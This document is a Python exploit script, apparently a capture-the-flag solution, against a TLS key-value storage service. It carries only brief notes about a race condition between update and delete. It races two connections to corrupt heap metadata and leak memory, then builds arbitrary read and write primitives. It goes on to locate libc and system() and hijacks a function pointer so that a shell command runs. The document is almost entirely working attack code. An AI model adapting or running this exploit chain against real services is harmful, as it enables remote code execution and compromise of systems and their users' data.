'''
the vulnerability is at s command, function gather_data
the u command isn't documented in h command, it seems useful because it can be
blocked.

race condition on update vs. get?
update checks whether there's already enough space for value, so decrease won't do anything.

update vs delete?
'''

import time
import re
from socket import *

from tqdm import tqdm
from tlslite.api import *

PORT = 20006


class Connection(object):
    def __init__(self, ip):
        self.s = create_connection((ip, PORT))
        self.s = TLSConnection(self.s)
        self.s.handshakeClientCert()

        banner = self.readline()

    def readline(self):
        res = []
        while True:
            c = self.s.recv(1)
            if c == b'':
                break
            res.append(c)
            if c == b'\n':
                break
        return b''.join(res)

    def close(self):
        self.s.close()
    
    def send(self, data):
        self.s.send(data)


def leak(ip):
    con1 = Connection(ip)
    con2 = Connection(ip)
    print('connected')

    # consolidate
    con1.send(b'X\n')
    print(con1.readline())
    con1.send(b's A %d\n' % 0x1000)
    con1.send(b'A' * 0x1000)
    print(con1.readline())
    con1.send(b'd A\n')
    print(con1.readline())

    # allocate dummies
    print('dummies')
    dummies = [b'dummy_%08x' % i for i in range(512) ]
    payload = b'B' * 8
    for dummy in tqdm(dummies):
        con1.send(b's %s %d\n' % (dummy, len(payload)))
        con1.send(payload)
        con1.readline()
    print('dummies done')

    # increase median (realloc), hang con1
    median = dummies[len(dummies) // 2]
    con1.send(b'u %s %d\n' % (median, 0x4000))
    con1.send(b'A' * (0x4000 - 4))

    # sleep to see if bp hit
    print('update sleep')
    time.sleep(1)

    # delete median
    con2.send(b'd %s\n' % median)
    print('con2', con2.readline())

    # create new keys
    NEW_KEY_SIZE = 32
    print('new_keys')
    new_keys = [b'new_key_%08x' % i for i in range(512)]
    new_keys = [b'new_key_%08x' % i for i in range(64)]
    for new_key in tqdm(new_keys):
        # size 32 to avoid hitting the freed data struct
        con2.send(b's %s %d\n' % (new_key, NEW_KEY_SIZE))
        con2.send(b'C' * NEW_KEY_SIZE)
        con2.readline()
    print('new_keys done')

    # create big data to "catch" the nullbyte
    # con2.send(b's big %d\n' % 0x4000)
    # con2.send(b'A' * 0x4000)
    # con2.readline()

    # change median length
    con1.send(b'\0' * 4)
    print('con1', con1.readline())

    # read new keys
    for new_key in new_keys:
        con2.send(b'g %s\n' % new_key)
        line = con2.readline()
        size = int(line.decode().split()[2])
        leaked_data = con2.s.recv(size)
        if size != NEW_KEY_SIZE:
            print(line)
            print('leak_data len', len(leaked_data))
            overriding_key = new_key
            break
    
    # update data
    # match = re.search(b'[\x11\x10]\0\0\0(.{4})\x20\0\0\0', leaked_data)
    match = re.search(b'\x11\0\0\0(.{4})\x20\0\0\0', leaked_data)
    match_start = match.start()

    new_data = bytearray(leaked_data)
    # new_data[match_start + 4:match_start + 4 + 4] = b'EEEE'
    # new_data[match_start + 8:match_start + 8 + 4] = b'\xff\xff\x00\x00'
    new_data[match_start + 8:match_start + 8 + 4] = b'\x00\x04\x00\x00'
    new_data = bytes(new_data)[:match.end()]

    # overflow
    con1.send(b'u %s %d\n' % (overriding_key, len(new_data)))
    con1.send(new_data)
    print(con1.readline())

    # find overriden key
    for new_key in new_keys:
        con2.send(b'g %s\n' % new_key)
        line = con2.readline()
        try:
            size = int(line.decode().split()[2])
        except ValueError:
            continue
        leaked_data = con2.s.recv(size)
        if size == 0x400:
            print(line)
            print('leak_data len', len(leaked_data))
            victim_key = new_key
            break
    
    print(overriding_key, victim_key, match)

    # print('clean')
    # for key_name in tqdm(set(dummies + new_keys) - {overriding_key}):
    #     if key_name in {overriding_key, victim_key}:
    #         continue

    #     con2.send(b'd %s\n' % key_name)
    #     con2.readline()

    # read after clean
    # print('re-leak')
    # con2.send(b'g %s\n' % victim_key)
    # line = con2.readline()
    # print(line)
    # # time.sleep(1)
    # size = int(line.decode().split()[2])
    # leaked_data = con2.s.recv(size)

    print('closing')
    time.sleep(1)

    con1.close()
    # con2.close()

    return Reader(con2, overriding_key, victim_key, new_data, match), int.from_bytes(new_data[match_start + 4:match_start + 4 + 4], 'little')


class Reader:
    def __init__(self, con, overriding_key, victim_key, pattern, match):
        self.con = con
        self.overriding_key, self.victim_key = overriding_key, victim_key
        self.pattern = pattern
        self.start, self.end = match.start(), match.end()

    def read(self, addr, size):
        new_data = bytearray(self.pattern)
        new_data[self.start + 4:self.start + 4 + 4] = addr.to_bytes(4, 'little')
        new_data[self.start + 8:self.start + 8 + 4] = size.to_bytes(4, 'little')
        new_data = bytes(new_data)

        self.con.send(b'u %s %d\n' % (self.overriding_key, len(new_data)))
        self.con.send(new_data)
        self.con.readline()

        self.con.send(b'g %s\n' % self.victim_key)
        line = self.con.readline()
        size = int(line.decode().split()[2])
        return self.con.s.recv(size)

    def write(self, addr, data):
        new_data = bytearray(self.pattern)
        new_data[self.start + 4:self.start + 4 + 4] = addr.to_bytes(4, 'little')
        new_data[self.start + 8:self.start + 8 + 4] = len(data).to_bytes(4, 'little')
        new_data = bytes(new_data)

        self.con.send(b'u %s %d\n' % (self.overriding_key, len(new_data)))
        self.con.send(new_data)
        self.con.readline()

        self.con.send(b'u %s %d\n' % (self.victim_key, len(data)))
        self.con.send(data)
        line = self.con.readline()


def dump_heap(reader, start_addr):
    addr = start_addr
    for i in tqdm(range(512 * 5)):
        size = int.from_bytes(reader.read(addr, 4), 'little')

        if size & 1 == 0:
            print('prev inuse = 0', hex(addr), hex(size))

        # print(hex(addr), hex(size))
        size &= 0xfffffff8
        addr += size


def find_heap_start(reader, start_addr):
    addr = start_addr & 0xfffff000
    while True:
        data = reader.read(addr, 0x20)
        if data.endswith(b'libgpg-error'):
            return addr, int.from_bytes(data[0x0c:0x10], 'little')
        addr -= 0x1000


def trigger_crash(con, payload):
    v = b'A' * (0x3c - 0x30) + payload
    con.s.send(b's foobar %d\n' % (-(0x1e + 0x3c - 0x20)))
    # self.s.send(b's foobar %d\n' % (-(0x1e + 0x3c - 0x20)))
    con.s.send(v)


def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    args = parser.parse_args()
    ip = args.ip

    # leak
    reader, some_addr = leak(ip)

    print('reading %08x' % some_addr)
    print(reader.read(some_addr - 4, 4).hex())
    heap_start, addr_in_libc = find_heap_start(reader, some_addr)
    print('heap_start', hex(heap_start), 'in libc', hex(addr_in_libc))

    DIFF_FROM_SYSTEM = 0x5266a
    system_addr = addr_in_libc + DIFF_FROM_SYSTEM
    print('system addr =', hex(system_addr))

    reader.write(some_addr, b'\0\0\0\0echo WIN > /tmp/win\0')
    print('wrote command to', hex(some_addr))

    payload = system_addr.to_bytes(4, 'little')
    payload += (some_addr - 0x55C).to_bytes(4, 'little')  # because of some check in _gnutls_recv_int
    payload += (some_addr + 4).to_bytes(4, 'little')

    print('trigger crash')
    time.sleep(1)

    con = Connection(args.ip)
    trigger_crash(con, payload)
    con.close()

if __name__ == '__main__':
    main()

